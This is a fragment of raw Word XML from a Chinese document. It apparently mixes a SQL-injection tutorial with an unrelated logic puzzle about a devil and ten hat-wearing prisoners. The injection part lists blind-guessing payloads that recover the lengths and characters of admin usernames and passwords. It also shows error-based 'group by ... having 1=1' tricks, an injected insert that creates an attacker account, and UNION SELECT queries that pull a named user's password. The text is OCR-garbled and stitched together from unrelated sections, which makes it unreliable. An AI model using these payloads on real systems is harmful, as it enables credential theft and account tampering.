        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">1= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(select count (*) from admin where len </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">(用户字段名称 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">name) ^0) and 1= (select count (*) from admin where len </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">(密码字段名称 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>password) &gt;0) 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>.猜解各个字段的长度猜解长度就是把知变换直到返回正确页面为止</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:top w:w="0" w:type="dxa"/>
          <w:left w:w="10" w:type="dxa"/>
          <w:bottom w:w="0" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="405"/>
        <w:gridCol w:w="1965"/>
        <w:gridCol w:w="555"/>
        <w:gridCol w:w="615"/>
        <w:gridCol w:w="615"/>
        <w:gridCol w:w="3750"/>
      </w:tblGrid>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="25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len (*) &gt;0)</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len (name) &gt;6)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>错误</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len (name) &gt;5)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>正确长度是</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="33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len (name) =6)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>正确</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len (password) &gt;11)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>正确</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len (password) &gt;12)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>错误长度是］</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>2</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len (password)=12)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>正确</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="330" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:gridSpan w:val="2"/>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6</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>.猜解字符</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left (name, l)=a)—</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>猜解用户帐号的第</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="330" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:gridSpan w:val="2"/>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_位</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and</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(select count(*)</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from</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admin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where</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left (name, 2)=ab)—</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>猜解用户帐号的第</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>二位</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="360" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来 了</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="322" w:lineRule="exact"/>
        <w:ind w:left="360" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">1= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(select top </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">count (*) from Admin where Asc (mid(pass, 5,1) )=51) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>-- 这个查询语句可以猜解中文的用户和密而.只要把后面的数字换成中文的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ASSIC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>码就</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">0K. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>最后把结果再转换成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>字符.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>group by users, id having 1=1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一一</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="326" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>group by users, id, users, username, users, password, users, privs having 1=1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一一</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="326" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>;insert into users values( 666, at lacker, foobar, Oxffff )</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="326" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>UNION SELECT TOP 1 COLUMN NAME FROM INFORMATION SCHEM. COLUMNS WHERE</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TABLE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>AME= logintable-</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UNION SELECT TOP 1 COLUMN NAME FROM INFORMATION SCHEM. COLUMNS WHERE</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TABLE_NAJ.!E= logintable WHERE COLUMNJIAME NOT IN</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(login_id)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-</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UNION SELECT TOP 1 COLUMN</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>AME FROM INFORJ.tATION_SCHEM. COLUMNS WHERE</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TABLE_NAJ.!E= logintable WHERE COLUMNJIAME NOT IN</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(login_id, login_najne)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-</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UNION SELECT TOP 1 login.name FKOM logintable-</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>UNION SELECT TOP 1 password FKOM logintable where login_najne=Rahul—</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="198" w:name="bookmark207"/>
      <w:bookmarkEnd w:id="198"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>分现在有</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个人被一个魔鬼逮住了。魔鬼对于直接把人 杀</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>掉的方</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>法不感兴趣了。于是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>，他</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>就想了一个杀人的新花样。 是这样的，一天晚上，魔鬼向着十个人宣布了游戏</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>规则，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>即 明天早上他要把</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 xml:space="preserve">个人排成一排，然后从一堆既有无限多 的白帽子混着无限多黑帽子的帽子堆为每个人随机抽取一 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>顶</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>帽子，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>给他们</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>个人</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>都戴上帽子。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>因为</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个人是排成一 排的，所以排在第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>个的人</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>可以看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>到前面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>个人帽子的颜 色，排在第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>个人可以看到前面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>个人的帽子</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的颜色</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>，…以 此类推。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>然后，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>魔鬼会从排在第</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个人开始，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>问他，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">你头 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
